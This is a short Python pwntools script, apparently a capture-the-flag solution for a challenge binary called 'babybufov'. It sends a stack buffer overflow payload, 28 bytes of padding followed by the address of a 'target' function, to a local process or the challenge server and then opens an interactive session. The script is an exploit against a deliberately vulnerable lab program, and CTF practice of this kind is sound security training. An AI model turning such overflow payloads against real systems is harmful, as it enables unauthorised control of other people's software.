#!/usr/bin/env python3

from pwn import *

EXE = ELF("./babybufov")
rop = ROP(EXE)

print(EXE.path)
if args.REMOTE:
    r = remote("challenge.ctf.games", 32136)
elif args.GDB:
    r = gdb.debug(EXE.path, "b vuln")
else:
    r = process(EXE.path)

payload = b"A" * 28 + p64(EXE.symbols["target"])

r.recvuntil(b"Gimme some data!\n")
r.sendline(payload)
r.interactive()
